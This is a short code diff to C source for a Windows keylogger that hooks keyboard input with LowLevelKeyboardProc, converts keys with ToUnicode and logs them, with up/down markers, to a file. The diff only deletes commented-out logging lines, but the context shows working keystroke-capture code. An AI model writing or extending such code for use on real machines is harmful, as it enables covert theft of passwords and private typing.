@@ -27,7 +27,7 @@ int LogUnicodeCharToFile(WCHAR *key, int state)
     }
     else if (state == UP)
     {
-        // fwprintf(file, L"%s", L"[UP]  ::  ");
+       
         fputs("[UP]    ::  ", file);
     }
     fclose(file);
@@ -60,11 +60,6 @@ LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
         WCHAR buf[10] = {0};
         int res = ToUnicode(KB_struct_pointer->vkCode, KB_struct_pointer->scanCode, state, buf, 10, 0);
 
-        /*
-        fwprintf(logfile,L"%s", buf);
-        fflush(logfile);
-        CloseLogFile(logfile);
-        */
         if (wParam == WM_KEYDOWN)
         {
             if (res == 1)
